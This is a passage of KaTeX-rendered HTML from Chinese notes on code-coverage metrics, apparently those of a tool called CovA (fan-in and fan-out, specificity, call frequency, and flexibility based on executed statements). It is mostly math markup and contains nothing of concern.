stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>n</mi><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fanin(f),fanout(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">anin</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq>是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mo>−</mo><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">fan-in</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">in</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mo>−</mo><mi>o</mi><mi>u</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">fan-out</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span></span></span></span></eq>,分别是 图中调用<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>的函数数量和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>调用的函数数量</li><li>由某论文可知 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>t</mi><mi>i</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">util</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span></eq>取值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>之间,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>n</mi><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>n</mi><mi>o</mi><mi>u</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">fanin,fanout</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">anin</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span></span></span></span></eq>取值0到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>N</mi><mi mathvariant="normal">∣</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">|N|-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>之间,而当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fanin(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">anin</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq>越大,即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>被更多函数调用,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>n</mi><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fanout(f)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">an</span><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span></span></span></span></eq>越小,即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>调用的函数越少,则函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>更可能是一个工具类,有很高的实用性指标,所以它有较低的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Specificity</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Sp</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>值</li></ul></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>r</mi><mi>e</mi><mi>q</mi><mi>u</mi><mi>e</mi><mi>n</mi><mi>c</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Frequency</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">re</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">cy</span></span></span></span></eq>(调用频率):公式<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mi>r</mi><mi>e</mi><mi>q</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><msub><mi>N</mi><mi>f</mi></msub><msub><mi>N</mi><mi>I</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">freq(f,I)=\frac{N_f}{N_I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">re</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1963em;vertical-align:-0.836em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.836em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>f</mi></msub></mrow><annotation encoding="application/x-tex">N_f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>表示函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中被调用的次数,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">N_I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中输入的数量</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>i</mi><mi>b</mi><mi>i</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo stretchy="false">(</mo><mtext>灵活度</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Flexibility(灵活度)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">Fl</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">ibi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span><span class="mord cjk_fallback">灵活度</span><span class="mclose">)</span></span></span></span></eq>:<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>分析函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>的执行情况<ul><li>对于每个被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>执行的函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>跟踪对于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中的每个<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></eq>,被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></eq>执行的所有语句集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(f,i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></eq>.如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>没有被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></eq>执行,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">S(f,i)=\emptyset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">∅</span></span></span></span></eq></li><li>然后计算在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中被执行函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>中唯一语句集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c(f,I)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span></span></span></span></eq></li><li>例子:假设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中包含3个输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_0,i_1,i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>被这些输入执行的语句集合分别是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><msub><mi>i</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">}</mo><mo separator="true">,</mo><mi>S</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><msub><mi>i</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">}</mo><mo separator="true">,</mo><mi>S</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><msub><mi>i</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">S(f,i_0)= \{ s_0,s_1 \},S(f,i_1)=\{s_0\},S(f,i_2)=\{s_0,s_1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 